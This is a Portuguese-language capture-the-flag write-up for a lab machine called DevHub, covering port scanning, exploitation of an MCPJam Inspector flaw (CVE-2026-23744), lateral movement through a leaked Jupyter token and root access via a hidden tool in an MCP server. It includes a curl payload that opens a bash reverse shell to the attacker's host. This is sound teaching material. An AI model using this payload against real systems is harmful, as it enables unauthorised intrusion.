#ctfs 

![DevHub — captura 1](Imagens/Pasted%20image%2020260929213801.png)

# Coleta de Informações

Vamos começar com um scan de portas via `nmap` no host fornecido.

```shell
└─$ nmap 10.129.97.32 --open -Pn -sC -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 21:43 -03
Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 61.28% done; ETC: 21:48 (0:01:48 remaining)
Nmap scan report for 10.129.97.32
Host is up (0.14s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 268.31 seconds
``` 

Vamos realizar um scan mais aprofundado nas portas abertas a fim de verificar versões de serviços.

```shell
└─$ nmap 10.129.97.32 --open -Pn -p 22,80,6274 -sV 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 21:54 -03
Nmap scan report for 10.129.97.32
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
6274/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.95%I=7%D=9/29%Time=6ABC5DC2%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credential
SF:s:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20
SF:charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Wed,\x2030\x20Sep\x202026\
SF:x2000:53:07\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<
SF:html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/
SF:svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20na
SF:me=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\
SF:"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x
SF:20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-
SF:DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>
SF:\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20<
SF:/body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content
SF:\r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-m
SF:ethods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent
SF:-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Wed,\x2030\x20Sep\x2
SF:02026\x2000:53:09\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReques
SF:t,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credent
SF:ials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DEL
SF:ETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset
SF:=UTF-8\r\nDate:\x20Wed,\x2030\x20Sep\x202026\x2000:53:10\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSS
SF:tatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.07 seconds
``` 

O resultado deu tenebroso, mas percebam que é uma requisição HTTP. Ou seja, temos duas portas abertas em serviços Web e um domínio em `devhub.htb`
# Enumeração

## Serviço Web - Porta 80

Após adicionar o domínio `devhub.htb` em `/etc/hosts`, podemos tentar acessar a página da internet associada.

![DevHub — captura 2](Imagens/Pasted%20image%2020260929215729.png)

Agora fez sentido a porta 6274 aberta. É um MCP - Model Context Protocol. Vamos verificar tecnologias associadas ao site

```shell
└─$ whatweb http://devhub.htb/  
http://devhub.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.97.32], Title[DevHub - Internal Development Platform], nginx[1.18.0]
``` 

Nos revelou pouca coisa, vamos continuar com uma enumeração de diretórios

```shell
└─$ dirsearch -u http://devhub.htb/ -w /usr/share/wordlists/dirb/big.txt -x 404,500 -r
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 20469

Output File: /home/pentecostes/reports/http_devhub.htb/__26-09-29_21-59-11.txt

Target: http://devhub.htb/

[21:59:11] Starting:                                                                
                                                                             
Task Completed 
``` 

Não nos trouxe nada, o que nos leva a crer que é uma página informativa e que nosso objeto de análise deva ser a outra porta (6274), a qual realmente roda um serviço.

## Serviço Web - Porta 6274

![DevHub — captura 3](Imagens/Pasted%20image%2020260929220007.png)

Ao abrirmos no navegador encontramos uma página de aplicação conforme verificamos pelas informações no site da porta 80.

# Exploração

Observe que temos um MCPJam. Ao pesquisarmos na internet vulnerabilidades conhecidas encontramos o [CVE-2026-23744](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6)

Podemos modificar a prova de conceito para estabelecer um shell reverso conseguimos acesso ao servidor.

```shell
└─$ curl http://10.129.97.32:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  --data-raw '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/[meu IP]/4444 0>&1"],"env":{}},"serverId":"mytest"}'
{"success":false,"error":"Connection failed for server mytest: MCP error -32001: Request timed out","details":"MCP error -32001: Request timed out"} 
``` 

O que nos traz a conexão reversa

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [meu IP] from (UNKNOWN) [10.129.97.32] 40280
bash: cannot set terminal process group (1077): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
whoami
mcp-dev
``` 

# Pós exploração

## Movimento Lateral

Tendo a conexão reversa, estabeleci um túnel via `ligolo` de modo a podermos observar quais serviços rodam internamente em loopback no alvo.

```shell
└─$ nmap 240.0.0.1 -p 22,80,5000,6274,8888 -Pn --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 23:46 -03
Nmap scan report for 240.0.0.1
Host is up (0.65s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
6274/tcp open  unknown
8888/tcp open  sun-answerbook

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```

Ao analisarmos os arquivos do sistema encontramos um arquivo de configuração com algumas informações interessantes

```shell
mcp-dev@devhub:/etc/systemd/system$ cat jupyter.service
cat jupyter.service
[Unit]
Description=Jupyter Notebook Server
After=network.target

[Service]
Type=simple
User=analyst
WorkingDirectory=/home/analyst
Environment=PATH=/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin
Environment=JUPYTER_TOKEN=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
ExecStart=/home/analyst/jupyter-env/bin/jupyter lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' --ServerApp.password='' --ServerApp.allow_origin='' --ServerApp.disable_check_xsrf=False
Restart=always
RestartSec=10
```

Observe esse trecho `ServerApp.Token`. O que isso significa? Significa que é possível fazer login sem senha, apenas fazendo uso do token. Basta colar no navegador o endereço `http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` que conseguiremos acessar a página.

![DevHub — captura 4](Imagens/Pasted%20image%2020260930105529.png)

Ao clicarmos em `Terminal` abre-se um terminal interativo na conta `analyst`, ou seja, temos um movimento lateral

```shell
analyst@devhub:~$ whoami
analyst
```

Basta agora ler a flag

```shell
analyst@devhub:~$ ls
jupyter-env  notebooks  user.txt
analyst@devhub:~$ cat user.txt
[flag user.txt]
```

## Escalação de privilégios

Após digitar `ps aux`para vermos os processos ativos na máquina descobri algo interessante

```shell
root        1084  0.0  0.7 398864 29156 ?        Ss   00:37   0:13 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Um processo rodando em root de um arquivo em Python no diretório do usuário `analyst`

Vamos ver do que se trata o arquivo

```python
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management

"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "[hint]"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "[hint]": {
        "description": "[hint]",
        "parameters": {"[hint]": "[hint]"}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}


def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get("[hint]", "")
    return api_key == VALID_API_KEY


@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - [hint] header"
    })


@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "[hint]"})


@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({
            "error": "Unauthorized",
            "message": "Valid [hint] header required"
        }), 401

    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })


@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({
            "error": "Unauthorized",
            "message": "Valid [hint] header required"
        }), 401

    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})

    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400

    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404

    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })

    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "[hint]", "status": "running", "pid": "[hint]"},
                {"name": "[hint]", "status": "running", "pid": "[hint]"}
            ]
        })

    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })

    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[hint]",
                "[hint]"
            ]
        })

    # Hidden functionality redacted because it reveals the CTF solution.
    elif tool_name == "[hint]":
        target = args.get('[hint]', '')
        confirm = args.get('[hint]', False)

        if not confirm:
            return jsonify({
                "error": "[hint]",
                "usage": "[hint]",
                "warning": "[hint]"
            })

        if target == "[hint]":
            try:
                with open('[hint]', 'r') as f:
                    sensitive_data = f.read()
                return jsonify({
                    "target": "[hint]",
                    "sensitive_data": "[hint]",
                    "note": "[hint]"
                })
            except Exception as e:
                return jsonify({
                    "target": "[hint]",
                    "error": f"Could not read sensitive value: {str(e)}"
                })

        elif target == "[hint]":
            return jsonify({
                "target": "[hint]",
                "dump": {
                    "[hint]": "[hint]"
                }
            })

        elif target == "[hint]":
            return jsonify({
                "target": "[hint]",
                "[hint]": {
                    "[hint]": "[hint]"
                }
            })

        return jsonify({
            "error": "Invalid target",
            "valid_targets": ["[hint]"]
        })

    return jsonify({"error": "Tool execution failed"}), 500


if __name__ == '__main__':
    app.run(host='[hint]', port='[hint]', debug=False)
```

**OBS: Todas as informações que pudessem levar a uma resposta rápida do CTF foram substituídas por [HINT]**

Temos muitas informações relevantes nele, desde o TOKEN correto para se autenticar sem ser barrado até informações de arquivos como as keys de SSH do admin que podem ser requisitadas através do formulário JSON.

Após ler o arquivo python, podemos passar os dados do payload em JSON na requisição do Burp a fim de podermos ler a key privada SSH do root

![DevHub — captura 5](Imagens/Pasted%20image%2020260930134518.png)

Agora podemos autenticar

```shell
└─$ ssh -i id_rsa root@10.129.97.32
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Sep 30 04:40:46 PM UTC 2026

  System load:           0.04
  Usage of /:            86.0% of 9.50GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             237
  Users logged in:       0
  IPv4 address for eth0: 10.129.97.32
  IPv6 address for eth0: dead:beef::a0de:adff:fe79:205

  => / is using 86.0% of 9.50GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Sep 30 16:40:48 2026 from 10.10.17.151
root@devhub:~# whoami
root
```

Por fim, lemos a flag de root

```shell
root@devhub:~# cat root.txt
[flag root.txt]
```

Assim, encerra-se nosso desafio.
